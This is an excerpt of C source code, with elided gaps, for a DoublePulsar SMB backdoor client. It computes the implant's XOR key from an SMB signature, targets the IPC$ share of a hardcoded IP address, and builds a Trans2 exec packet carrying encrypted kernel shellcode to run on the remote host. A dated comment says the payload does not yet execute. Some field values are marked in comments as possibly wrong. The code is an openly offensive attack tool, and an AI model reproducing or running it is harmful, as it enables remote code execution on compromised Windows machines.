...
/*
19/8/2021: Code works but doublepulsar doesn't execute the payload
*/
...
{
	unsigned int x = 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) |
		(((sig << 16) | sig & 0xFF00) << 8));
	x = x & 0xffffffff;
	return x;
}
...
int main(int argc, char* argv[])
{
	...
	sprintf((char*)tmp, "\\\\192.168.0.11\\IPC$");
	...
	s = (unsigned int)s;
	unsigned int XorKey = ComputeDOUBLEPULSARXorKey((unsigned int)s);
	...
	*/
	...
	//1011 bytes
	unsigned char cs_kernelshellcode[] =
	...
	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, sizeof(dwPayloadShellcodeSize));
	...
	execpacket.SmbMessageLength = htons(4174);
	...
	execpacket.TreeId = trans2_smb_response->TreeId;				//grab from SMB response
	execpacket.multipleID = 0x42;

	//trans2 packet stuff
	execpacket.wordCount = 15; // 0x0F == 15 
	execpacket.totalParameterCount = 0x0C; // should be 12
	execpacket.totalDataCount = SWAP_SHORT(htons(4096)); // should be 0
	...
	//trying little endian format for timeout
	execpacket.timeout = SWAP_WORD(0x25891a00); //0x25 0x89 0x1a 0x00 EXEC command
	...
	execpacket.DataCount = SWAP_SHORT(htons(4096));          //should be 0 -> 0x0000
	...
	execpacket.ByteCount = SWAP_SHORT(htons(4109));          //value should be 13
	...
	unsigned int B4_XOR_TotalSizeOfPayload = EntireShellcodeSize+2;
	unsigned int B4_XOR_ChunkSize = 4096;
	unsigned int B4_XOR_OffsetofChunkinPayload = 0;
	unsigned char* B4_XOR_Parametersbuffer[13];
	...
	//hexDump the buffer
	char dumpbuffer[4178];
	memcpy(dumpbuffer, (char*)&execpacket, sizeof(execpacket));
	hexDump(NULL, dumpbuffer, 4178);
